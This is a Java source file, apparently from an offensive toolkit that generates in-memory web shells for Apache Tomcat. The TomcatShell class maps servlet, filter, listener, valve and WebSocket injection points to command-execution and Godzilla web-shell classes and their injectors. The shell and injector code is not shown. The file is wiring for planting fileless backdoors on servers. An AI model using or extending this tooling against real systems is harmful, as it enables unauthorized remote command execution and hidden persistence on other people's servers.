package com.reajason.javaweb.memshell;

import com.reajason.javaweb.config.ShellTool;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.command.CommandServlet;
import com.reajason.javaweb.memshell.shelltool.command.CommandValve;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaServlet;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaValve;
import com.reajason.javaweb.memshell.tomcat.command.CommandListener;
import com.reajason.javaweb.memshell.tomcat.command.CommandWebSocket;
import com.reajason.javaweb.memshell.tomcat.godzilla.GodzillaListener;
import com.reajason.javaweb.memshell.tomcat.injector.*;
import org.apache.commons.lang3.tuple.Pair;

import java.util.List;
import java.util.Map;

import static com.reajason.javaweb.config.Constants.*;

/**
 * @author ReaJason
 * @since 2024/11/22
 */
public class TomcatShell extends AbstractShell {
    public static final String WEBSOCKET = "WebSocket";
    public static final String VALVE = "Valve";
    public static final String JAKARTA_VALVE = "JakartaValve";
    public static final String UPGRADE = "Upgrade";
    public static final String EXECUTOR = "Executor";

    @Override
    public List<ShellTool> getSupportedShellTools() {
        return List.of(ShellTool.Godzilla, ShellTool.Command);
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getCommandShellMap() {
        return Map.of(
                SERVLET, Pair.of(CommandServlet.class, TomcatServletInjector.class),
                JAKARTA_SERVLET, Pair.of(CommandServlet.class, TomcatServletInjector.class),
                FILTER, Pair.of(CommandFilter.class, TomcatFilterInjector.class),
                JAKARTA_FILTER, Pair.of(CommandFilter.class, TomcatFilterInjector.class),
                LISTENER, Pair.of(CommandListener.class, TomcatListenerInjector.class),
                JAKARTA_LISTENER, Pair.of(CommandListener.class, TomcatListenerInjector.class),
                VALVE, Pair.of(CommandValve.class, TomcatValveInjector.class),
                JAKARTA_VALVE, Pair.of(CommandValve.class, TomcatValveInjector.class),
                WEBSOCKET, Pair.of(CommandWebSocket.class, TomcatWebSocketInjector.class)
        );
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getGodzillaShellMap() {
        return Map.of(
                SERVLET, Pair.of(GodzillaServlet.class, TomcatServletInjector.class),
                JAKARTA_SERVLET, Pair.of(GodzillaServlet.class, TomcatServletInjector.class),
                FILTER, Pair.of(GodzillaFilter.class, TomcatFilterInjector.class),
                JAKARTA_FILTER, Pair.of(GodzillaFilter.class, TomcatFilterInjector.class),
                LISTENER, Pair.of(GodzillaListener.class, TomcatListenerInjector.class),
                JAKARTA_LISTENER, Pair.of(GodzillaListener.class, TomcatListenerInjector.class),
                VALVE, Pair.of(GodzillaValve.class, TomcatValveInjector.class),
                JAKARTA_VALVE, Pair.of(GodzillaValve.class, TomcatValveInjector.class)
        );
    }
}